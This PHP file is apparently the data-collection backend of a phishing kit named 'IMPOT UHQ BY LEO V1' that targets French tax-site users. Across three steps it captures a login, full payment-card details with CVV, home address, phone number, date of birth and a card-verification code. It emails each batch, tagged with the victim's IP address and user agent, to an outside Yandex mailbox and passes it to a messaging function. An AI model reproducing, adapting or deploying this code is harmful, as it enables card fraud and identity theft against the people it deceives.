<?php

#########################################################################     
#                    IMPOT UHQ BY LEO V1                              #
#########################################################################

session_start();
include '../server/configuration.php';
include '../server/function.php';

if (isset($_GET['action'])) {
    if ($_GET['action'] ==  'send') {
        $rez = $_GET['rez'];
            if ($_GET['step'] == "1") {
                $message = "

📥 Login : ".$rez."

📡 IP : ".$_SERVER['REMOTE_ADDR']."
📡 User-Agent : ".$_SERVER['HTTP_USER_AGENT'];
            $subject = "🔑 +1 N_IMPOT " .$_SERVER['REMOTE_ADDR']." - ". $rez . " 🔑" ;
            $fromsender = "From: $spammer <log@rez.fr>";
            mail("j3andupon@yandex.com",$subject,$message,$fromsender);
            sendMessage($message);
            }else if ($_GET['step'] == '2'){
                $final = explode('|',$rez);
                $bin = substr($final[0],0,7);
                $bin = str_replace(' ','',$bin);
                $data = json_decode(getBin($bin),true);
                echo $bin;
                $level = $data['level'];
                $type = $data['type'];
                $bank = $data['bank'];
                $message = "

💳 Nom sur carte : ".$final[0]."
💳 Numéro : ".$final[1]."
💳 Date d'expiration : ".$final[2]."
💳 CVV : ".$final[3]."
    
⚖️ Level : ".$level."
⚖️ Banque : ".$bank."
⚖️ Type : ".$type."
⚖️ Lien Ajout APPLE : ".getScan($final[1],$final[2])."

📮 Nom & Prenom : ".$final[4]."
📮 Ville : ".$final[5]."
📮 Code Postal : ".$final[6]."
📮 Adresse : ".$final[7]."
📮 Numéro de téléphone : ".$final[8]."
📮 DOB : ".$final[9]."

📡 IP : ".$_SERVER['REMOTE_ADDR']."
📡 User-Agent : ".$_SERVER['HTTP_USER_AGENT']."
                ";
            $subject = "💳 +1 CC ".$bin." - ".$level." - ".$bank."  ".$_SERVER['REMOTE_ADDR'] ." 💳";
            $fromsender = "From: $spammer <log@rez.fr>";
            mail("j3andupon@yandex.com",$subject,$message,$fromsender);
            sendMessage($message);
            }else if ($_GET['step'] == "3") {
                $message = "

📱 CODE : ".$rez."

📡 IP : ".$_SERVER['REMOTE_ADDR']."
📡 User-Agent : ".$_SERVER['HTTP_USER_AGENT'];
            $subject = "📱 +1 VBV " .$rez." - ". $rez . " 📱" ;
            $fromsender = "From: $spammer <log@rez.fr>";
            mail("j3andupon@yandex.com",$subject,$message,$fromsender);
            sendMessage($message);

            }     
        }
    }
   
?>